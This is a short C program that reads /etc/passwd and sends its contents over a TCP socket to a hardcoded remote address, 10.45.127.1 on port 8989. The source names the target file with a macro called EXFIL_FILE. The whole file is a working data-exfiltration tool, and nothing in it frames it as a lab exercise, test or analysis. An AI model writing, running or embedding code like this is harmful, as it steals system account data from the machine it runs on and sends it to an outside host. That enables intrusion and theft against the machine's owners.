#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
#define SERVER_PORT 8989
#define SERVER_IP "10.45.127.1"
#define EXFIL_FILE "/etc/passwd"

int main(int argc, char *argv[]) {
    int sockfd, filefd, ret;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Open the file for reading
    filefd = open(EXFIL_FILE, O_RDONLY);
    if (filefd < 0) {
        perror("Failed to open file");
        return 1;
    }

    // Create a TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return 1;
    }

    // Set up the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Failed to convert IP address");
        return 1;
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to connect to server");
        return 1;
    }

    // Read data from the file and send it over the socket
    while ((ret = read(filefd, buffer, BUFFER_SIZE)) > 0) {
        if (send(sockfd, buffer, ret, 0) < 0) {
            perror("Failed to send data");
            return 1;
        }
    }

    if (ret < 0) {
        perror("Failed to read data from file");
        return 1;
    }

    // Close the file and socket
    close(filefd);
    close(sockfd);

    printf("Data sent successfully.\n");

    return 0;
}
